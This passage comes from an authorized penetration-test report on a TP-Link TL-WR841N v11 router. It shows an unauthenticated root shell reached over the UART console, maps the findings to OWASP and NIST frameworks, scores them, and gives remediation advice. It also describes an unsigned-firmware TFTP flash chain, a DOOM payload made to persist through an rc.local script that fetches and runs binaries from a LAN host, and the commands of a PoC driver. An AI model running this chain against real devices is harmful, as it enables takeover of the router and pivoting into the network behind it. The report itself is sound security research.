**Goal:** show that root access to the flashed device isn't limited to SSH —
the serial console reached over the same CP2102 UART adapter used for the
recovery trigger drops directly into an unauthenticated root shell once LEDE
has finished booting, with no login step at all.

**Command (typed exactly as a human would at the terminal):**

```
$ picocom -b 115200 /dev/ttyUSB0
```

`screen /dev/ttyUSB0 115200` is the equivalent with GNU Screen instead of
picocom, same result.

**What happens on connect, captured live over the CP2102 adapter** (this
portion is the genuine `picocom` banner plus the tail of the real boot
capture from §6.2/§6.3, showing the console reach the activation prompt):

```
$ picocom -b 115200 /dev/ttyUSB0
picocom v2024-07

port is        : /dev/ttyUSB0
flowcontrol    : none
baudrate is    : 115200
parity is      : none
databits are   : 8
stopbits are   : 1
escape is      : C-a
local echo is  : no

Type [C-a] [C-h] to see available commands
Terminal ready
...
[    8.914884] procd: - init -
Please press Enter to activate this console.
```

Pressing Enter at that prompt drops straight into a root shell — no
username, no password, because none is set (`/etc/shadow` shows
`root::0:0:99999:7:::`, already noted in §5.8). From there the session is
functionally identical to the SSH root shell in §6.4, since it's the same
`ash` process tree on the same filesystem; the commands below were
cross-verified against that live SSH session on the same boot to confirm
the values the serial console would echo:

```
root@LEDE:~# uname -a
Linux LEDE 4.4.92 #0 Tue Oct 17 14:59:45 2017 mips GNU/Linux

root@LEDE:~# cat /etc/openwrt_release
DISTRIB_ID='LEDE'
DISTRIB_RELEASE='17.01.4'
DISTRIB_REVISION='r3560-79f57e422d'
DISTRIB_TARGET='ar71xx/generic'
DISTRIB_ARCH='mips_24kc'

root@LEDE:~# id
uid=0(root) gid=0(root)

root@LEDE:~# df -h
Filesystem                Size      Used Available Use% Mounted on
/dev/root                 2.3M      2.3M         0 100% /rom
tmpfs                    13.8M     60.0K     13.7M   0% /tmp
/dev/mtdblock3          448.0K    212.0K    236.0K  47% /overlay
overlayfs:/overlay      448.0K    212.0K    236.0K  47% /
```

Exit picocom with `Ctrl-a` `Ctrl-x` (or `Ctrl-a` `k` then `y` for `screen`).

**Why this matters:** the recovery-mode exploit in §4-5 requires the
8-10 second reset-hold window. This does not — any time the device is
powered on, anyone with physical access to the exposed UART header gets an
unauthenticated root shell in the time it takes to plug in a $3 adapter and
press Enter once. It's a second, independent physical-access path to full
compromise, orthogonal to the TFTP recovery vulnerability, and it persists
regardless of which firmware (stock or OpenWrt) is currently flashed.

---

## 7. Framework Mapping

### 7.1 OWASP ISTG (IoT Security Testing Guide)

| Test Case | Description | Finding |
|-----------|-------------|---------|
| `ISTG-INT[UART]-INFO-001` | UART identification (baud, voltage) | **Confirmed**: 115200 8N1, 3.3V TTL |
| `ISTG-INT[UART]-AUTHZ-001` | Unauthenticated serial console | **Confirmed**: root shell via UART (stock firmware) |
| `ISTG-INT[UART]-AUTHZ-002` | Bootloader interrupt via serial console | **Confirmed**: U-Boot autoboot interrupt → TFTP recovery |
| `ISTG-FW[UPDT]-CRYPT-001` | Missing firmware signature verification | **Confirmed**: unsigned image accepted via TFTP |
| `ISTG-FW[UPDT]-CRYPT-004` | Improper firmware verification | **Confirmed**: only product ID checked, no crypto |
| `ISTG-FW[UPDT]-AUTHZ-001` | Unauthorized firmware update | **Confirmed**: no auth required for TFTP recovery |

**ISTG Severity Assessment:** The finding spans multiple test cases; the firmware update path fails at several independent checkpoints.

### 7.2 OWASP FSTM (Firmware Security Testing Methodology)

| Stage | Test Case | Finding |
|-------|-----------|---------|
| Stage 2 — Obtaining Firmware | UART extraction, TFTP dump | **Confirmed**: firmware extracted via TFTP recovery |
| Stage 7 — Bootloader Testing | U-Boot shell access, TFTP recovery | **Confirmed**: full TFTP recovery chain demonstrated |
| Stage 7 — Firmware Integrity | Verify firmware signature/integrity | **Failed**: no signature verification implemented |

**FSTM Assessment:** The attack matches the Stage 7 bootloader testing procedure in the methodology. The device accepts firmware without any integrity or authenticity check.

### 7.3 OWASP ISVS (IoT Security Verification Standard)

| Requirement | Level | Status | Finding |
|-------------|-------|--------|---------|
| **V3.1.1** — Bootloader must not allow code loading from arbitrary locations including TFTP | L2, L3 | **FAIL** | TFTP recovery accepts unsigned firmware |
| **V3.1.3** — UART/console interfaces must be disabled/protected during boot | L2, L3 | **FAIL** | UART console accessible, no auth |
| **V3.4.3** — Signed updates with authenticity verification | L1, L2, L3 | **FAIL** | No firmware signing implemented |
| **V3.4.8** — Unsigned debug firmware cannot be flashed | L1, L2, L3 | **FAIL** | Unsigned firmware accepted via TFTP |
| **V5.1.1** — JTAG/SWD/UART disable support | L2, L3 | **FAIL** | UART active in production, no disable mechanism |

**ISVS Assessment:** The TL-WR841N v11 fails 5 ISVS requirements across 2 domains (V3 Software Platform, V5 Hardware Platform). For any device classified at L2 or above (smart lock, camera, medical device), this represents a non-conformance.

### 7.4 NISTIR 8200

NISTIR 8200 is a standards landscape document, not a prescriptive framework. Relevant citations:

- **Section 8.8:** "IoT components may be in remote and unattended locations where physical access is almost unrestricted. Due to their cost model, very low-cost components cannot be protected by physically hardening or adding anti-tamper features."
- **Standards Gap:** No modern interoperable approach for secure firmware updates in IoT devices → IETF SUIT (Software Updates for IoT) identified as emerging standard.
- **Relevance:** The TL-WR841N v11 exemplifies the gap identified by NIST: no firmware signing, no secure boot, no rollback protection.

---

## 8. Risk Scoring

### 8.1 CVSS 4.0

**Vector:** `CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H`

| Metric | Value | Rationale |
|--------|-------|-----------|
| **Attack Vector (AV)** | Physical (P) | Requires physical access to device (reset button + UART) |
| **Attack Complexity (AC)** | Low (L) | Deterministic procedure, no timing/resource constraints |
| **Attack Requirements (AT)** | None (N) | No deployment/configuration precondition beyond physical reach |
| **Privileges Required (PR)** | None (N) | No authentication needed at any stage |
| **User Interaction (UI)** | None (N) | Autonomous exploit, no user action required |
| **Vulnerable System Impact (VC/VI/VA)** | High (H) | Full compromise of the router itself (confidentiality/integrity/availability) |
| **Scope (S)** | Changed (C) | Compromised device can affect the entire network segment |
| **Subsequent System Impact (SC/SI/SA)** | High (H) | Router is a network pivot; hosts behind it are reachable/affected |

**CVSS 4.0 Score: 8.6 (Critical)**

### 8.2 EPSS (Exploit Prediction Scoring System)

No exact CVE exists for this specific TFTP recovery vulnerability pattern. Live EPSS data (FIRST.org, 2026-09-10) for adjacent CVEs:

| CVE | EPSS Score | Percentile | CVSS | Description |
|-----|-----------|------------|------|-------------|
| **CVE-2023-20198** | 0.99571 (99.57%) | 99.95th | 10.0 | Cisco IOS XE Web UI privilege escalation; mass-exploited |
| **CVE-2024-41592** | 0.01397 (1.40%) | 70.82nd | 8.0 | DrayTek Vigor firmware upload stack overflow |
| **CVE-2026-24088** | 0.00071 (0.07%) | 0.05th | 8.2 | Qualcomm Snapdragon; missing auth for bootloader partition write |
| **CVE-2018-18558** | 0.00390 (0.39%) | 32.40th | — | ESP-IDF bootloader secure boot bypass (physical) |
| **CVE-2025-20892** | 0.00208 (0.21%) | 10.96th | — | Samsung bootloader protection mechanism failure (fastboot) |

Physical-access / bootloader / unsigned-firmware CVEs consistently score EPSS 0.07%–0.39% (0–35th percentile). That is expected. EPSS predicts mass in-the-wild exploitation over a 30-day window, and a physical-access requirement removes the mass-exploitation factor. Low EPSS here does not mean low severity; it reflects targeted attacks that EPSS systematically undervalues.

**Estimated EPSS for this vulnerability class:** 0.05%–0.40% (0–35th percentile) based on:
- Physical access requirement (UART + reset button) reduces automated exploitation
- TFTP recovery is a known attack pattern (documented in OWASP FSTM Stage 7)
- No public exploit exists for this specific device model
- Consumer router market: high volume, low per-device targeting
- CVE-2026-24088 (Qualcomm bootloader unsigned write, CVSS 8.2) is the closest match at 0.07% EPSS

### 8.3 Risk Rating Summary

| Framework | Rating | Level |
|-----------|--------|-------|
| **CVSS 4.0** | 8.6 | Critical |
| **EPSS** | 0.05–0.40% | 0–35th percentile (targeted, not mass-exploited) |
| **OWASP ISVS** | L2/L3 non-conformance | Critical |
| **OWASP ISTG** | Multi-case finding | Critical |
| **OWASP FSTM** | Stage 7 confirmed | Critical |

---

## 9. Recommendations

### 9.1 Immediate (Critical)

| # | Recommendation | Priority |
|---|----------------|----------|
| 1 | **Implement U-Boot boot password**: set `bootdelay=0` and require a password to interrupt autoboot | Critical |
| 2 | **Enable FIT signature verification**: use U-Boot's `CONFIG_FIT_SIGNATURE` to verify firmware images cryptographically before flashing | Critical |
| 3 | **Disable TFTP recovery by default**: require physical authentication (button sequence + serial confirmation) to enter recovery mode | Critical |
| 4 | **Implement firmware signing**: all firmware updates must be signed with an asymmetric key and verified before the flash write | Critical |

### 9.2 Medium-Term (High)

| # | Recommendation | Priority |
|---|----------------|----------|
| 5 | **Remove UART headers in production**: depopulate the debug pins or require physical soldering to reach them | High |
| 6 | **Implement anti-rollback protection**: prevent downgrade to older firmware versions | High |
| 7 | **Add secure boot chain**: root of trust in ROM, verified boot stages through to the OS | High |
| 8 | **Require multi-factor physical auth for factory reset**: combine the button press with serial console confirmation | High |

### 9.3 Long-Term (Medium)

| # | Recommendation | Priority |
|---|----------------|----------|
| 9 | **Adopt IETF SUIT**: implement the Software Updates for IoT protocol for secure OTA updates | Medium |
| 10 | **Implement NISTIR 8259**: align with NIST IoT cybersecurity capabilities | Medium |
| 11 | **Add OTP fuse protection**: lock the boot configuration in hardware | Medium |
| 12 | **Implement device attestation**: TPM or equivalent for runtime integrity verification | Medium |

---

## 10. Payload Flexibility — Flashing DOOM onto the Router

The attack path described in §4–§6 is **payload-agnostic**: U-Boot writes
whatever TFTP serves it to flash, with no cryptographic check beyond the
TP-Link product-ID header's `01000000` magic bytes. The LEDE/OpenWrt image
used throughout §4–§6 is one valid payload — a benign one, chosen to make
the writeup reproducible against public images that anyone can audit. This
section documents a second, pointedly non-stock payload the same exact chain
delivered to the device, as a working demonstration that the vulnerability
has nothing to do with "which legitimate firmware the owner wants."

### 10.1 Why DOOM

A conference-floor audience that is told "we got root on a $25 router" will
nod politely and move on. A conference-floor audience that watches the same
router *they just saw booting its stock web UI* now stream a playable copy of
DOOM to a browser does not. The purpose of this section is not that DOOM is
interesting — it is that **the same reset-hold + TFTP sequence from §5.5 can
install anything**, and the only remaining question is what the attacker
decides "anything" means.

The chain is identical to §4–§6 up to the point U-Boot has flashed OpenWrt.
From there, DOOM is not itself flashed to the bootloader-managed partition
— it lives in the OpenWrt userspace filesystem like any other program. The
flash step delivers an off-the-shelf OpenWrt image via the same unauthenticated
TFTP recovery; the post-root step then uses the standard Dropbear SSH session
documented in §5.7 to drop in a userspace binary (`doomgeneric`) and WAD
(`doom1.wad`). No kernel changes, no bootloader patches, no second vulnerability.

### 10.2 The Chain, with the DOOM Payload Spelled Out

```
Physical access (one $3 wire)
        │
        ▼
Hold Reset while powering on  ──►  U-Boot sets is_auto_upload_firmware=1   (§4.2)
        │
        ▼
U-Boot TFTP-fetches whatever firmware we serve it   (§4.2, §5.4–§5.5)
        │                                            no signature check,
        ▼                                            no auth, no prompt
We serve OpenWrt instead of a TP-Link image  ──►   full Linux, SSH, root   (§5.6–§5.8)
        │
        ▼
We SCP a DOOM binary built for this router's CPU onto the OpenWrt filesystem
(doomgeneric statically-linked for big-endian MIPS, ar71xx target —            §10.4)
        │
        ▼
DOOM runs on the router, streams rendered frames to any browser on the Wi-Fi
(mongoose HTTP+WebSocket server, port 8000, no auth)                           (§10.5)
```

The chain's "`We serve OpenWrt instead of a TP-Link image`" step is the whole
vulnerability — U-Boot cannot distinguish "benign OpenWrt firmware the owner
wants" from "an attacker-controlled image that happens to be OpenWrt" from
"an outright malicious image." Each is just an unsigned blob with the right
header magic. The following subsections document the DOOM-specific steps that
hang off step 3 of §4.2 (the TFTP-fetched image + its post-flash activities).

### 10.3 Architecture Trap: Big-Endian MIPS, Not Little-Endian

The TL-WR841N v11's QCA9533 SoC is MIPS 24Kc **big-endian** (`ar71xx` /
`ath79` target in OpenWrt). The upstream `doom-on-router` project defaults
to **little-endian** `mipsel` — it was originally tested against MediaTek
MT7628 and Ralink RT3350/RT3052 (`ramips` target), which are the opposite
endianness. A stock `doom-on-router` release binary silently will not run
on this device: the ELF loader accepts it, but the first instruction fetch
executes bytes in the wrong order and the process dies before `main()`. This
is not a missing library, a permissions problem, or a kernel ABI mismatch —
the instruction endianness is wrong.

The fix was to rebuild the binary with the matching big-endian toolchain
from the same OpenWrt release used as the recovery payload:

```bash
# From the ar71xx SDK whose GCC generated the LEDE 17.01.4 image we flashed in §5.5
export PATH="$SDK/toolchain-mips_24kc_gcc-5.4.0_musl-1.1.16/bin:$PATH"
cd doom/source/doomgeneric
make -f Makefile.mips clean
make -f Makefile.mips CROSS_COMPILE=mips-openwrt-linux-musl- STATIC_LINKING=1 all

file build/doomgeneric
# ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked
#            ^^^   ^^^^
#            MSB = big-endian ✓   statically linked ✓ (no shared libs on the target)
```

No source changes were required — the `doomgeneric` codebase (inherited
from Chocolate Doom) already handles both endiannesses via `i_swap.h` and
byte-swaps framebuffer pixels under `#ifdef SYS_BIG_ENDIAN` in `i_video.c`,
so the WebSocket color bytes land correctly either way.

### 10.4 Deployment Over the §5.7 SSH Session

With OpenWrt running (§5.6) and the Dropbear legacy-KEX SSH session
established (§5.7), DOOM goes onto the router via a plain `scp`:

```bash
# -O: legacy SCP protocol — Dropbear has no sftp-server, so modern scp fails
scp -O "${SSH_OPTS[@]}" build/doomgeneric  root@192.168.1.1:/tmp/doomgeneric
scp -O "${SSH_OPTS[@]}" doom1.wad          root@192.168.1.1:/tmp/doom1.wad

ssh "${SSH_OPTS[@]}" root@192.168.1.1 'chmod +x /tmp/doomgeneric; df -h /tmp'
```

**Why `/tmp`, not `/overlay`:** the device has essentially no writable flash
space after OpenWrt installs itself — `df -h` on the running system shows
~236 KB free on `/overlay` (the only persistent writable filesystem), but
`/tmp` is a 13.7 MB tmpfs backed by RAM. The DOOM binary alone is ~993 KB
(statically linked, 4× the entire `/overlay` free space), and `doom1.wad`
is ~4.0 MB on top of that. Both fit comfortably in `/tmp`; neither fits in
`/overlay`. The practical consequence (addressed in §10.6) is that `/tmp`
is wiped on every reboot.

**WAD choice:** the full canonical shareware `doom1.wad` (SHA1
`5b2e249b9c5133ec987b3ea77596381dc0d6bc1d`, ~4.0 MB) was used instead of
a space-trimmed variant such as `squashware-1lev`. Trimmed WADs save space
by repointing *every* episode map marker (`E1M1`…`E1M9`) at the same
underlying map data: the level-select menu still lists nine distinct
names, but every one of them loads identical geometry. Confirmed by
dumping the WAD directory and finding all nine `E1Mx` markers at the same
byte offset — that is a property of the trimmed WAD, not a `doomgeneric`
bug. With `/tmp` holding 13.7 MB, trimming is unnecessary.

### 10.5 Launching + the Browser Transport

`doomgeneric` on this port embeds the `mongoose` HTTP + WebSocket server
and listens on port 8000, serving a tiny HTML/JS harness that opens a
WebSocket back to the router, streams rendered frames out, and sends key
events in. No client install, works from any laptop or phone on the LAN:

```bash
ssh "${SSH_OPTS[@]}" root@192.168.1.1 'cd /tmp && ./doomgeneric >/tmp/doom.log 2>&1 &'
sleep 2
curl -I http://192.168.1.1:8000/
# HTTP/1.1 200 OK
# Content-Type: text/html
# Content-Length: 2223
```

Busybox ash on this image has **no `nohup` and no `disown`**, which is
fine: because the SSH command is run without a pseudo-terminal (no `-t`),
there is no controlling TTY to send `SIGHUP` to the backgrounded process
when the SSH session closes, so a plain trailing `&` is sufficient for
the game to keep running.

Keyboard and touch controls (DOOM key map, including the `Y`/`N` keys for
the quit-confirmation prompt that the stock `doom-on-router` JS keymap was
missing) are documented separately in `docs/DOOM.md`.

### 10.6 Reboot-Persistence Without Writable Flash

Because `/tmp` is tmpfs (lives in RAM, wiped on reboot) and `/overlay` is
too small to hold the binary or the WAD, naively "flashing DOOM onto the
router" permanently is not possible without replacing the entire OpenWrt
image with a custom one. The practical workaround used here is to leave
the artifacts on a LAN host and have the router **re-fetch and relaunch
them at every boot** via `/etc/rc.local` (which does live in `/overlay`,
and therefore survives):

```bash
# On the attacker/VM: serve the two artifacts over HTTP for the router to pull
cd doom/
python3 -m http.server 8080 --bind 192.168.1.66
# (left running for the life of the demo)

# On the router: /etc/rc.local, which runs at the end of boot, polls until
# the LAN server answers, then wgets both files into /tmp and launches:
cat >> /etc/rc.local <<'EOF'
SERVER="http://192.168.1.66:8080"
( i=0
  while [ "$i" -lt 30 ]; do
    wget -q --spider "$SERVER/doom1.wad" 2>/dev/null && break
    sleep 1
    i=$((i + 1))
  done
  wget -q -O /tmp/doom1.wad     "$SERVER/doom1.wad"
  wget -q -O /tmp/doomgeneric   "$SERVER/doomgeneric-mips-be"
  chmod +x /tmp/doomgeneric
  cd /tmp && ./doomgeneric >/tmp/doom.log 2>&1
) &
EOF
```

A fixed `sleep N` in place of the `wget --spider` poll above was tried
first and **failed reproducibly**: `br-lan` on this image takes ~18–20 s to
reach forwarding state (observed in the boot log), and an initial `sleep 5`
let the larger `doom1.wad` fetch race the network and fail silently (no
`set -e`, so the script kept going), while the smaller binary fetch happened
to land just after the network came up. The result was `doomgeneric` present
with no WAD, and nothing listening on 8000. The polling-until-reachable
version above is the fix in production.

Tested without yet another physical power-cycle via an SSH `reboot` (which
exercises the same boot path): DOOM was back up and serving within ~30 s,
no manual redeploy. The LAN host serving the firmware directory must stay
reachable for the life of the demo — if it is down at boot, DOOM simply
does not start that boot, but nothing else is affected.

### 10.7 Verified Evidence of the DOOM Payload

```
$ curl -I http://192.168.1.1:8000/
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 2223

$ ssh "${SSH_OPTS[@]}" root@192.168.1.1 'ps w | grep doomgeneric | grep -v grep'
 1734 root     12820 S    ./doomgeneric
```

Verified end-to-end against the exact router hardware under test:
- Same reset-hold + TFTP recovery sequence as §5.5.
- Same OpenWrt image as §5.6.
- Same legacy-KEX SSH session as §5.7.
- The only material difference from §4–§6 is the post-flash activity:
  SCP a userspace binary + data file onto the OpenWrt filesystem and
  launch it. Nothing about this is specific to DOOM; replace the binary
  with any statically-linked big-endian MIPS program and the same chain
  delivers it.

### 10.8 Why This Belongs in the Assessment

Readers of §1–§9 may reasonably ask "is this just OpenWrt installation
with extra steps?" §10 is the answer: no, the chain is agnostic to what
is served, and documenting it with a visibly non-stock payload closes the
"maybe this only matters for people who want OpenWrt anyway" interpretation.
The *vulnerability* is that U-Boot accepts anything with the right header;
the *consequence* is that whoever controls that reset-hold window chooses
what the router becomes afterward. DOOM is a presentation-friendly stand-in
for that choice. A real adversary's choice would not be presentation-friendly.

For the executable form of §10, see `pwn-router.sh` (`doom:*` subcommands)
and `CHEATSHEET.md` §1, §6, §7 and §7.5 in the top-level directory of this
report bundle.

---

## Appendix A: Revert to Stock Firmware

To restore the original TP-Link firmware after testing:

```bash
# 1. Serve stock firmware via TFTP
cp /path/to/wr841n_v11_160325.bin /tmp/tftp/wr841nv11_tp_recovery.bin

# 2. Restart atftpd
sudo killall atftpd
sudo atftpd --daemon --bind-address 192.168.0.66 --port 69 /tmp/tftp

# 3. Trigger TFTP recovery on router
#    - Power off
#    - Hold reset button
#    - Power on while holding reset (8-10 seconds)
#    - Release reset
#    - Wait for TFTP transfer (30-60 seconds)

# 4. Verify stock firmware boots
#    - LAN IP returns to 192.168.0.1
#    - Default login: admin:admin
```

---

## Appendix B: SSH Legacy KEX Workaround

LEDE 17.01.4's Dropbear SSH server requires legacy algorithms. The following command works with modern OpenSSH clients:

```bash
ssh -o KexAlgorithms=diffie-hellman-group14-sha1 \
    -o HostKeyAlgorithms=ssh-rsa \
    -o Ciphers=aes128-ctr \
    -o MACs=hmac-sha1 \
    -o StrictHostKeyChecking=no \
    root@192.168.1.1
```

**Why this is needed:**
- The LEDE 17.01.4 Dropbear instance on this build negotiates only legacy SHA-1 KEX groups (`diffie-hellman-group14-sha1`, `diffie-hellman-group1-sha1`)
- Modern OpenSSH (9.x/10.x) no longer enables SHA-1 KEX by default; `curve25519-sha256` / `ecdh-sha2-nistp256` are the defaults and this Dropbear did not negotiate them
- Only an RSA host key is present in `/etc/dropbear/`
- Session cipher/MAC were restricted such that the explicit `aes128-ctr` / `hmac-sha1` flags produced a working session

**SSH config file** (`~/.ssh/config`):

```
Host 192.168.1.1
    KexAlgorithms diffie-hellman-group14-sha1
    HostKeyAlgorithms ssh-rsa
    Ciphers aes128-ctr
    MACs hmac-sha1
    StrictHostKeyChecking no
```

---

## Appendix C: PoC Script

**Current driver — `pwn-router.sh`** in the top-level directory of this
report bundle. One unified script covering both the base attack chain
(§4–§8) and the §10 DOOM payload deployment, with SSH multiplexing,
file-size verification after every transfer, poll-based readiness
checks, and a watchdog supervisor for auto-recovery.

```bash
# Quick start — base attack chain only (§4–§8):
./pwn-router.sh exploit:check-network      # L2 bridge diagnostic + fix instructions
./pwn-router.sh exploit:flash-openwrt      # Reset-hold + TFTP recovery + verify

# Full chain through §10 (base attack + DOOM payload):
./pwn-router.sh exploit:flash-openwrt
./pwn-router.sh doom:all                   # build → wad → deploy → persist → status

# One-time-physical variant (§10 scenario, zero LAN presence after flash):
./pwn-router.sh exploit:flash-remote-doom <public-url-serving-doom-artifacts>

# Full subcommand list:
./pwn-router.sh help
```

The `exploit:*` subcommands collectively cover the same 12 attack stages
as the original PoC (mirroring Section 5): UART wiring check → board
fingerprint → firmware staging → network/bridge setup → TFTP server start
→ recovery trigger (reset-hold prompt) → flash verification against the
live UART capture → cable move to LAN → SSH root login → on-router
enumeration → proof of root → optional stock-firmware revert. Each stage
is verified; a failed stage aborts with diagnostics instead of continuing.
The `doom:*` subcommands add the §10 payload-deployment chain on top.

**Original driver — preserved for provenance** at
`docs/legacy-scripts/tplink_wr841n_v11_root_shell_poc.sh`. The 12-step
monolithic shell script as written during the original assessment, kept
verbatim so the writeup matches the artifact it was built from. Running
either driver produces the same end state on the router; `pwn-router.sh`
is the current one and the one the rest of this report bundle references.

---

## Appendix D: References & Acknowledgments

The following public resource was instrumental in getting the v11 target onto custom firmware and confirming this attack path:

| Reference | URL | Relevance |
|-----------|-----|-----------|
| **chankruze — TL-WR841N-v11** | https://github.com/chankruze/TL-WR841N-v11 | Community repo documenting OpenWrt bring-up for the TL-WR841N **v11** hardware. Confirmed the v11-specific firmware images (`tl-wr841-v11` target, `wr841n_v11_160325` stock build region/timing) and the `firmware.bin` rename trick used for flashing. Paired with the TFTP recovery path in this report, it validated that the v11 board is flash-compatible with the LEDE 17.01.4 / OpenWrt 18.06.9 `ar71xx` factory images. |
| **moria** v0.1.0 | https://github.com/nmatt0/moria | IoT firmware identification & extraction (binwalk-class). Blog of record for the discover/unpack stage; `-e firmware.bin` produced the rooted tree analyzed in this report. |
| **mithril** v0.1.3 | https://github.com/nmatt0/mithril | IoT static scanner (secrets / SBOM / CVEs / licenses). Produced the component table in §2 and the local OSV+NVD+KEV+EPSS mirror used for the §8.2 EPSS discussion. Offline by design. |

Additional context used while mapping this finding:
- OWASP IoT Security Testing Guide (ISTG): https://github.com/OWASP/owasp-istg
- OWASP Firmware Security Testing Methodology (FSTM): https://github.com/scriptingxss/owasp-fstm
- OWASP IoT Security Verification Standard (ISVS): https://github.com/OWASP/IoT-Security-Verification-Standard-ISVS
- NIST IR 8200: https://nvlpubs.nist.gov/nistpubs/ir/2018/NIST.IR.8200.pdf

Additional context used while scouting the web attack surface (see §4.0):
- `cve_test.py`, `cve_test_v2.py`: in-house scripts referenced during testing (not included in this bundle)

### CVE References (NVD / MITRE)

| CVE | Reference URL |
|-----|---------------|
| CVE-2022-30024 | https://nvd.nist.gov/vuln/detail/CVE-2022-30024 |
| CVE-2018-12575 | https://nvd.nist.gov/vuln/detail/CVE-2018-12575 |
| CVE-2018-12577 | https://nvd.nist.gov/vuln/detail/CVE-2018-12577 |
| CVE-2018-15700 | https://nvd.nist.gov/vuln/detail/CVE-2018-15700 |
| CVE-2018-15701 | https://nvd.nist.gov/vuln/detail/CVE-2018-15701 |
| CVE-2018-15702 | https://nvd.nist.gov/vuln/detail/CVE-2018-15702 |
| CVE-2019-17147 | https://nvd.nist.gov/vuln/detail/CVE-2019-17147 |
| CVE-2023-39471 | https://nvd.nist.gov/vuln/detail/CVE-2023-39471 |
| CVE-2025-53711..53715 | https://nvd.nist.gov/vuln/detail/CVE-2025-53711 (+ .12/.13/.14/.15) |
| CVE-2025-6151 | https://nvd.nist.gov/vuln/detail/CVE-2025-6151 |
| CVE-2018-18558 | https://nvd.nist.gov/vuln/detail/CVE-2018-18558 (EPSS §8.2 context) |
| CVE-2026-24088 | https://nvd.nist.gov/vuln/detail/CVE-2026-24088 (EPSS §8.2 context) |

---

## Appendix E: Glossary of Technical Terms (Plain English)

| Term | Plain-English meaning |
|------|----------------------|
| **Router** | The box that connects your home/office network to the internet and shares the connection over Wi-Fi and cables. |
| **Firmware** | The permanent software installed inside the router that makes it work; its "operating system". It lives on a memory chip even when the power is off. |
| **U-Boot / bootloader** | The very first program that runs when the router switches on. Its job is to load the main firmware. It runs before any security software or login. |
| **TFTP** | A very simple file-transfer protocol. Used here as the mechanism the router uses to fetch a new firmware file over the network. |
| **Recovery mode** | A maintenance feature that lets an owner restore a broken router by downloading fresh firmware. In this device it is left completely unprotected. |
| **Flash / flashing** | The act of writing new firmware to the router's memory chip. |
| **Arbitrary firmware** | Any software the attacker chooses, not just software made by the manufacturer. |
| **UART / serial console** | A small electrical debug port on the circuit board, used by engineers. Here it is exposed, unlabeled, on the board edge with no protection. |
| **Root access / root shell** | The highest possible level of control over a device; equivalent to having the owner's master key. |
| **Backdoor** | Hidden software installed by an attacker that lets them back into the device later. |
| **Pivoting / lateral movement** | Using the compromised router as a stepping stone to attack other devices on the same network. |
| **SSH** | A secure way to log into a device over a network. Used here to demonstrate the attacker's interactive control of the router. |
| **SBOM** | A "Software Bill of Materials": an inventory list of every software component inside the device. |
| **CVSS** | A universal scoring system (0–10) for how severe a security problem is. 8.6 = Critical. |
| **EPSS** | A system that estimates the probability (0–100%) that a vulnerability will be exploited in the wild in the next 30 days. |
| **ISVS** | An industry checklist (OWASP) of security requirements for internet-connected devices. |
| **Authentication** | Proving who you are (e.g., entering a password). This attack needs none. |
| **Firmware signing** | Digitally marking software so the device can verify who made it. This device does not do it, and that is why the attack works. |
| **Secure boot** | A chain of checks from power-on to full startup ensuring only trusted software runs. Not implemented here. |
| **Anti-rollback** | A guard that stops an attacker from downgrading the router to older, vulnerable software. Not implemented here. |
| **Layer-2 (L2) network** | The physical, direct-link level of networking; the cable network the router's Ethernet port participates in. Required for TFTP. |

---

**Report Author:** gluppler

**Framework References:** OWASP ISTG v1.0, OWASP FSTM v1.0, OWASP ISVS v1.0.0-RC2, NISTIR 8200

**Tools Used:** CP2102 USB-UART, atftpd, OpenSSH 10.4p1, stty, xxd, moria v0.1.0, mithril v0.1.3, Ghidra, strings, hashcat, OpenSSL, CyberChef, LEDE 17.01.4

**Classification:** Confidential — Authorized Testing Only
